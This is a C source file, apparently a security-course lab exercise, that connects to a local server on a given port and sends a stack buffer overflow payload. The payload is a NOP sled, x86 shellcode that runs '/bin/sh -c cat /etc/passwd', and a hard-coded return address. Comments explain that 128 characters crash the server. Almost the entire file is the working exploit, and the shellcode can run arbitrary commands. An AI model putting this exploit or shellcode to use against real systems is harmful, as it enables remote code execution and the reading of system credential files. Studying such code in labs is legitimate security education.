#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

//+ Forward declarations for DoAttack and Attack. //-
void DoAttack(int PortNo);
void Attack(FILE *outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

// This array contains the hex representation of the instructions in exploit.nasm. The length of this array is 134 = 128 (number of 'X' characters) + 2 (newline and null characters) + 4 ('WXYZ').
char compromise1[134]={

    // compromise code goes here..
    // 128 ('X' characters) - 97 (length of the code) = 31 nop instructions for padding.
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0x90,
     0xEB,
     0x29,
     0x5E,
     0x31,
     0xC0,
     0x88, // mov flagStr
     0x46,
     0x07, 
     0x88, //mov comdStr
     0x46,
     0x0B,
     0x88, // mov arrayAddr
     0x46,
     0x20,
     0x89, // mov arrayAddr
     0x46,
     0x2D,
     0x89, // mov arrayAddr
     0x76,
     0x21,
     0x8D,
     0x7E,
     0x09,
     0x89,
     0x7E,
     0x25,
     0x8D,
     0x7E,
     0x0C,
     0x89,
     0x7E,
     0x29,
     0xB0,
     0x0B,
     0x89,
     0xF3,
     0x8D,
     0x4E,
     0x21,
     0x31,
     0xD2,
     0xCD,
     0x80,
     0xE8,
     0xD2,
     0xFF,
     0xFF,
     0xFF,
     0x2F,
     0x62,
     0x69,
     0x6E,
     0x2F,
     0x73,
     0x68,
     0x58,
     0x79,
     0x2D,
     0x63,
     0x58,  
     0x63,
     0x61,
     0x74,
     0x20,
     0x2F,
     0x65,
     0x74,
     0x63,
     0x2F,
     0x70,
     0x61,
     0x73,
     0x73,
     0x77,
     0x64,
     0x3B,
     0x65,
     0x78,
     0x69,
     0x74,
     0x58,            
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,

     //buffer address
     0x40,
     0x9c,
     0x04,
     0x08,
    // newline, null terminator
    0x0A,0x00
};

// 128 'x' characters were needed to crash the server. 
char * compromise =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxx"
    "WXYZ\n";

//+ Function to attack the server. //-
void Attack(FILE *outfile){
    fprintf(outfile,compromise1);
    fflush(outfile);
}

